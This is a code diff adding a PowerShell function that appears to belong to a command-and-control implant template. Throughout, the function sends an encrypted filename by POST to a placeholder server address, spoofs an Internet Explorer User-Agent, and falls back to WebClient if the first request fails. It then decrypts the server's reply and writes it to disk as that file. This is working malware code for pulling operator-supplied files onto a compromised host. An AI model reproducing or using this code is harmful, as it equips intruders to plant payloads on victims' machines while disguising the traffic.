@@ -1,0 +1,22 @@
+function up($filename){
+
+$filenameenc=enc $key $filename
+
+try{
+    $postParams = @{resource=$windows;file=$filenameenc}
+     $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{upload}  -Method POST -Body $postParams
+     $re=$re.Content
+}
+catch{
+$postParams = "resource=$windows&file=$filenameenc"
+       $wc3 = new-object net.WebClient
+     $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+     $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+     $re=$wc3.UploadString("{HTTP}://{ip}:{port}{upload}","POST",$postParams)
+       }
+
+$data=dec $key $re 1
+
+echo $data | Set-Content $filename -Encoding Byte
+
+}
